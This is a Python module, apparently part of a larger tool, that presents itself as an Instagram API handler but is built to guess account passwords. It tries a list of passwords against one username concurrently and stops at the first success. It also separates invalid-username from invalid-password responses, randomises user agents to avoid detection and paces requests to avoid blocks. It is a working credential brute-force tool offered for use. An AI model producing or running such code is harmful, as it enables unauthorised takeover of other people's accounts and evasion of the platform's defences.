"""
Instagram API Handler with Error Resistance and Rate Limiting
"""

import random
import time
import asyncio
from typing import Optional, Dict, Any, Tuple
from dataclasses import dataclass
import instaloader
from instaloader import Instaloader, BadCredentialsException, ConnectionException, InstaloaderException, LoginRequiredException, ProfileNotExistsException
from instaloader.structures import Profile
import requests
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from config import config

logger = logging.getLogger(__name__)

@dataclass
class LoginResult:
    success: bool
    username: str
    password: str
    message: str = ""
    profile: Optional[Dict[str, Any]] = None
    error_type: Optional[str] = None

class InstagramAPIHandler:
    def __init__(self):
        self.rate_limiter = RateLimiter(config.INSTAGRAM_RATE_LIMIT)
        self.session_lock = Lock()
        self.sessions = {}
        self.executor = ThreadPoolExecutor(max_workers=config.MAX_CONCURRENT_CHECKS)
        
    def create_session(self, username: str = None, password: str = None) -> Instaloader:
        """Create a new Instagram session with custom settings"""
        L = Instaloader(
            request_timeout=config.INSTAGRAM_TIMEOUT,
            max_connection_attempts=config.MAX_RETRIES,
            download_pictures=False,
            download_videos=False,
            download_video_thumbnails=False,
            save_metadata=False,
            post_metadata_txt_pattern='',
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            quiet=True,
            sleep=False
        )
        
        # Randomize user agent to avoid detection
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        L.context.user_agent = random.choice(user_agents)
        
        return L

    def check_credentials(self, username: str, password: str) -> LoginResult:
        """Check if credentials are valid with error handling"""
        try:
            # Rate limiting
            self.rate_limiter.wait()
            
            L = self.create_session()
            
            try:
                # Try to login
                L.login(username, password)
                
                # Verify the session is valid
                try:
                    profile = Profile.from_username(L.context, username)
                    if profile:
                        return LoginResult(
                            success=True,
                            username=username,
                            password=password,
                            message="Login successful",
                            profile={
                                'username': profile.username,
                                'full_name': profile.full_name,
                                'followers': profile.followers,
                                'following': profile.followees,
                                'posts': profile.mediacount,
                                'bio': profile.biography,
                                'is_verified': profile.is_verified,
                                'profile_pic_url': profile.profile_pic_url
                            }
                        )
                except Exception as e:
                    logger.warning(f"Profile fetch failed for {username}: {e}")
                    # Even if profile fetch fails, login might have succeeded
                    return LoginResult(
                        success=True,
                        username=username,
                        password=password,
                        message="Login successful (profile fetch failed)",
                        error_type="profile_fetch_error"
                    )
                    
            except (BadCredentialsException, LoginRequiredException) as e:
                error_msg = str(e)
                if "invalid user" in error_msg.lower() or "not exists" in error_msg.lower():
                    return LoginResult(
                        success=False,
                        username=username,
                        password=password,
                        message="Invalid username",
                        error_type="invalid_username"
                    )
                elif "password" in error_msg.lower() or "credentials" in error_msg.lower():
                    return LoginResult(
                        success=False,
                        username=username,
                        password=password,
                        message="Invalid password",
                        error_type="invalid_password"
                    )
                else:
                    return LoginResult(
                        success=False,
                        username=username,
                        password=password,
                        message=f"Login error: {error_msg}",
                        error_type="login_error"
                    )
            except ProfileNotExistsException as e:
                return LoginResult(
                    success=False,
                    username=username,
                    password=password,
                    message="Invalid username",
                    error_type="invalid_username"
                )
            except ConnectionException as e:
                return LoginResult(
                    success=False,
                    username=username,
                    password=password,
                    message=f"Connection error: {e}",
                    error_type="connection_error"
                )
            except InstaloaderException as e:
                return LoginResult(
                    success=False,
                    username=username,
                    password=password,
                    message=f"Instagram error: {e}",
                    error_type="instagram_error"
                )
            except Exception as e:
                logger.error(f"Unexpected error for {username}: {e}")
                return LoginResult(
                    success=False,
                    username=username,
                    password=password,
                    message=f"Unexpected error: {e}",
                    error_type="unknown_error"
                )
                
        except Exception as e:
            logger.error(f"Critical error in check_credentials: {e}")
            return LoginResult(
                success=False,
                username=username,
                password=password,
                message=f"Critical error: {e}",
                error_type="critical_error"
            )

    def check_credentials_batch(self, username: str, passwords: list) -> list:
        """Check multiple passwords for a single username"""
        results = []
        
        # Use ThreadPoolExecutor for concurrent checking
        futures = []
        with ThreadPoolExecutor(max_workers=config.MAX_CONCURRENT_CHECKS) as executor:
            for password in passwords:
                future = executor.submit(self.check_credentials, username, password)
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                    # If we found a valid password, we can stop early
                    if result.success:
                        # Cancel remaining futures
                        for f in futures:
                            f.cancel()
                        break
                except Exception as e:
                    logger.error(f"Error in batch check: {e}")
                    results.append(LoginResult(
                        success=False,
                        username=username,
                        password="unknown",
                        message=f"Batch processing error: {e}",
                        error_type="batch_error"
                    ))
        
        return results

    async def check_credentials_async(self, username: str, password: str) -> LoginResult:
        """Async version of credential checking"""
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(self.executor, self.check_credentials, username, password)

class RateLimiter:
    """Simple rate limiter to prevent Instagram from blocking requests"""
    
    def __init__(self, rate_limit: int):
        self.rate_limit = rate_limit  # requests per minute
        self.min_interval = 60.0 / rate_limit  # minimum seconds between requests
        self.last_request_time = 0
        self.lock = Lock()
        
    def wait(self):
        """Wait until the next request can be made"""
        with self.lock:
            current_time = time.time()
            time_since_last = current_time - self.last_request_time
            
            if time_since_last < self.min_interval:
                sleep_time = self.min_interval - time_since_last
                time.sleep(sleep_time)
            
            self.last_request_time = time.time()

# Singleton instance
instagram_handler = InstagramAPIHandler()
